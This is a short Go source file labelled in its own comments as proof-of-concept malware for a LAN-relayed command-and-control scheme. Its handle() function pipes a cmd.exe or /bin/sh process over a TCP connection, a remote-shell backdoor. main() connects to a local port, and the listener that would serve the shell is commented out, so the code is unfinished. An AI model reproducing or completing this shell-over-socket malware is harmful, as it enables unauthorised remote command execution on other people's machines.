package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os/exec"
	"runtime"
)

/*
POC Malware

C2 malware connects to "parent" malware in lan
Child malware in lan conntects to parent to talk to C2

Child identifies parent malware via custom MAC address

*/
func OSCheck() string {
	OSShell := ""
	if runtime.GOOS == "windows" {
		fmt.Println("OS identified as Windows")
		//command =
		OSShell = "cmd.exe"
		// err := ni

	} else if runtime.GOOS == "linux" {
		fmt.Println("OS identified as: Linux")
		OSShell = "/bin/sh"

	}
	return OSShell

}

func handle(conn net.Conn) {

	/*
	 * Explicitly calling /bin/sh and using -i for interactive mode
	 * so that we can use it for stdin and stdout.
	 * For Windows use exec.Command("cmd.exe")
	 */
	cmd := exec.Command(OSCheck())
	//reader and writer pipes
	rp, wp := io.Pipe()
	// Set stdin to our connection
	cmd.Stdin = conn
	cmd.Stdout = wp
	//copy reader pipe into connection
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {

	//need to send ARP Broadcast with FFF:FF:FF: mac to send to all
	conn, err := net.Dial("tcp", "127.0.0.1:20080")
	if err != nil {
		// handle error
	}

	fmt.Fprintf(conn, "GET / HTTP/1.0\r\n\r\n")
	status, err := bufio.NewReader(conn).ReadString('\n')
	fmt.Println(status)
	// init
	// tcpAddr, err := net.ResolveTCPAddr(resolver, serverAddr)
	// if err != nil {
	// 	 // handle error
	// }
	// conn, err := net.DialTCP(network, nil, tcpAddr)
	// if err != nil {
	// 		// handle error
	// }

	// 	listener, err := net.Listen("tcp", ":20080")
	// 	if err != nil {
	// 		log.Fatalln(err)
	// 	}
	// 	fmt.Println("Waiting for Connection")
	// 	for {
	// 		conn, err := listener.Accept()
	// 		if err != nil {
	// 			log.Fatalln(err)
	// 		}
	// 		go handle(conn)
	// 	}

}
